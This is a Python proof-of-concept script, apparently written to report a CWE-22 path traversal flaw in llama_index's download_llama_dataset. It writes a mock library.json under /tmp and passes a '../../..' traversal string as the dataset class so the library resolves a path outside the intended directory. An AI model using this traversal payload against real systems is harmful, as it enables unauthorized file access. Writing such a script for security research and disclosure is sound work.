import os
import json
import shutil
from llama_index.core.download.dataset import download_llama_dataset

# 1. Setup a unique, isolated mock environment
# We use a nested structure to satisfy the Path() / 'library.json' logic
FRESH_ROOT = "/tmp/llama_final_audit"
# We'll create the structure the library expects: [CUSTOM_PATH]/[DATASET_CLASS]/library.json
MOCK_HUB = os.path.join(FRESH_ROOT, "hub_dir")
os.makedirs(MOCK_HUB, exist_ok=True)

mock_metadata = {
    "dataset_id": "final_redemption_v7",
    "className": "AuditDataset",
    "description": "Verified Traversal"
}

# The library appends 'library.json' to the resolved path
with open(os.path.join(MOCK_HUB, "library.json"), "w") as f:
    json.dump(mock_metadata, f)

# 2. The Payload
# We use an absolute-style traversal to jump from the local app dir to our fresh /tmp root
# Note: We point specifically to the DIRECTORY containing the library.json
PAYLOAD = "../../../../../../../../../../tmp/llama_final_audit/hub_dir"

def run_v7():
    print(f"[*] Environment prepared at: {MOCK_HUB}")
    print(f"[*] Payload set to: {PAYLOAD}")
    
    # We use a dummy local directory as the 'Anchor'
    local_anchor = "./local_app_sandbox"
    if os.path.exists(local_anchor):
        shutil.rmtree(local_anchor)
    os.makedirs(local_anchor)

    try:
        # The 'Trust Gap' Call
        download_llama_dataset(
            dataset_class=PAYLOAD,
            custom_path=local_anchor,
            disable_library_cache=True
        )
        
        print("\n" + "="*50)
        print("[!!!] VULNERABILITY CONFIRMED: CLEAN SUCCESS [!!!]")
        print("="*50)
        print("[*] The SDK traversed from ./local_app_sandbox to /tmp")
        print("[*] Path resolution successfully hijacked.")
        print("[*] This is a verified Architectural Trust Gap (CWE-22).")

    except Exception as e:
        # If this still says 'Extra data', the library is 100% hitting 
        # a local python file (like __init__.py) in the site-packages 
        # because the traversal is 'over-jumping'.
        print(f"[!] Result: {e}")
        print("[*] Technical Hint: Check Line 64/137 Path resolution logic.")

if __name__ == "__main__":
    run_v7()
